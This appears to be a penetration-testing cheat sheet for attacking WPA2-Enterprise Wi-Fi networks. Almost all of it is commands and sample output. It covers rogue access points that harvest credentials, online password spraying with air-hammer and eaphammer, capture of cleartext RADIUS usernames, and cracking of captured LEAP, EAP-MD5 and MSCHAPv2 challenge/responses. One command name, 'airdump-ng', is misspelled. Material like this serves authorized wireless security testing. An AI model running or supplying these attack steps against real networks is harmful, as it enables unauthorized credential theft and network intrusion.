# Attacking WPA2 Enterprise

## Fake Access Points

### Local Installation

```bash
git clone https://github.com/ricardojoserf/WPA_Enterprise_Attack
cd WPA_Enterprise_Attack && sudo sh install.sh
```

### Hostapd & Freeradius-wpe

**Start the Access Point:**
```bash
sh freeradius_wpe_init.sh $AP_NAME $INTERFACE
```

**Read logs when client connects:**
```bash
sh freeradius_wpe_read.sh
```

### Hostapd-wpe

```bash
sh hostapd_wpe_init.sh $AP_NAME $INTERFACE
```

---

## Brute-force / Password Spraying

**GitHub — Wh1t3Rh1n0/air-hammer**

```bash
root@kali:~# ./air-hammer.py --help

usage: air-hammer.py -i interface -e SSID -u USERFILE [-P PASSWORD]
                     [-p PASSFILE] [-s line] [-w OUTFILE] [-1] [-t seconds]

Perform an online, horizontal dictionary attack against a WPA Enterprise network.

optional arguments:
  -i interface  Wireless interface (default: None)
  -e SSID       SSID of the target network (default: None)
  -u USERFILE   Username wordlist (default: None)
  -P PASSWORD   Password to try on each username (default: None)
  -p PASSFILE   List of passwords to try for each username (default: None)
  -s line       Optional start line to resume attack. May not be used with a
                password list. (default: 0)
  -w OUTFILE    Save valid credentials to a CSV file (default: None)
  -1            Stop after the first set of valid credentials are found
                (default: False)
  -t seconds    Seconds to sleep between each connection attempt (default: 0.5)
```

**Example:**
```bash
root@kali:~# ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
[0] Trying alice:UserPassword1 ...
[1] Trying bob:UserPassword1 ...
[2] Trying charlotte:UserPassword1 ...
[3] Trying dave:UserPassword1 ...
[4] Trying wifiuser:UserPassword1 ...
[!] VALID CREDENTIALS: wifiuser:UserPassword1
[5] Trying wrongUser05:UserPassword1 ...
[6] Trying wrongUser06:UserPassword1 ...
```

---

## RADIUS Usernames Capture

> Wireshark > "Identity" field into EAP Message of type "Response, Identity"

```bash
python crEAP.py -i mon0 -c <channel>
```

> **Note:** Only possible when RADIUS Identity is sent in cleartext (EAP-MD5, LEAP, sometimes in weak config of other methods)

---

## RADIUS Accounts Bruteforce / Password Spraying

```bash
eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 --essid <target_ESSID>
```

---

## LEAP & EAP-MD5 Handshake Capture & Cracking

```bash
airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0

# For EAP-MD5
eapmd5pass -r <capture> -w <wordlist>

# For LEAP (crack MSCHAPv2 challenge/response)
asleap -r <capture> -W <wordlist>
```

> **Note:** LEAP & EAP-MD5 are old deprecated EAP methods that transmit client authentication (challenge/response) in cleartext.

---

## MSCHAPv2 Challenge/Response Capture (via Rogue AP) & Cracking

```bash
asleap -C <mschapv2_challenge> -R <mschapv2_response> -W <wordlist>
```

> **Note:** Possible when EAP methods is using MSCHAPv2 for client authentication (e.g. PEAPv0(MSCHAPv2), EAP-TTLS(MSCHAPv2))

**References:**
- https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html
- https://giuliocomi.blogspot.com/2018/06/wpa2-psk-vs-wpa2-enterprise-hacking-and.html
- https://github.com/Wh1t3Rh1n0/air-hammer
